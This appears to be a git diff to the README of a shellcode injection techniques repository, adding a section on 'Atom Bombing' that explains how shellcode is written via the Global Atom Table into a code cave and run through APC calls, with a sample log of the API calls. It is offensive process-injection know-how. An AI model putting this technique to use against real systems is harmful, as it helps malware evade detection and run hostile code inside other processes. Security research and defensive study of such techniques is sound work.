@@ -101,6 +101,36 @@ You can use a [PowerShell assembly injection technique](https://github.com/plack
 [+] RtlCreateUserThread() - thread handle: 0x384
 ```
 
+## Atom Bombing
+[AtomBomb.cs](https://github.com/plackyhacker/Shellcode-Injection-Techniques/blob/master/ShellcodeInjectionTechniques/Techniques/AtomBomb.cs) : This technique is interesting in how we write shellcode to the target process. We use the Global Atom Table which allows us to write null terminated strings with a maximum size of 255 bytes. We find a code cave to write our shellcode to, then use APC calls to trigger the target process to read the Atom Names into memory. Finally we use a couple of APC calls to change the memory protection of the target and execute the shellcode.
+
+My code differs from the original [Atom Bombing](https://www.fortinet.com/blog/threat-research/atombombing-brand-new-code-injection-technique-for-windows) technique, written in C/C++. First, I chain Atom Names together, using multiple APCs, to form a shellcode of larger than 255 bytes. I don't use ROP chains to force the target process to call `VirtualProtect` and then execute the code, I use the APC queue.
+
+This code requires the main thread to enter an alertable state in order to execute the APC queue and I do not clean up after the shellcode execution, the target process becomes unstable. I plan to improve on this technique (by seraching for alertable threads and cleaning up afterwards), but as a PoC it works well.
+
+```
+[+] Found process: 14140
+[+] Using technique: ShellcodeInjectionTechniques.AtomBomb
+[+] Found thread: 5940
+[+] OpenThread() - thread handle: 0xD0
+[+] FindWritablePages() - number found: 2
+[+] Found a suitable code cave - pWritable: 0x2CE60031
+[+] GetProcAddress() - pGlobalGetAtomNameW: 0x7FFE20EB2680
+[+] GlobalAddAtom() - ATOM: 0xC091
+[+] NtQueueApcThread() - pWritable: 0x2CE60031
+[+] GlobalAddAtom() - ATOM: 0xC06F
+[+] NtQueueApcThread() - pWritable: 0x2CE600F9
+[+] GlobalAddAtom() - ATOM: 0xC080
+[+] NtQueueApcThread() - pWritable: 0x2CE601C1
+[+] GlobalAddAtom() - ATOM: 0xC088
+[+] NtQueueApcThread() - pWritable: 0x2CE60289
+[+] GlobalAddAtom() - ATOM: 0xC084
+[+] NtQueueApcThread() - pWritable: 0x2CE60351
+[+] GetProcAddress() - pVirtualProtect: 0x7FFE20EBBC70
+[+] NtQueueApcThread() PAGE_EXECUTE_READWRITE - codeCave: 0x2CE60031
+[+] QueueUserAPC() - codeCave: 0x2CE60031
+```
+
 ## Notes
 Remember you will need to start a process to inject to, except when using the shellcode runner, local thread hijack technique or the process hollowing technique (this technique starts a new process in the suspended state).
 
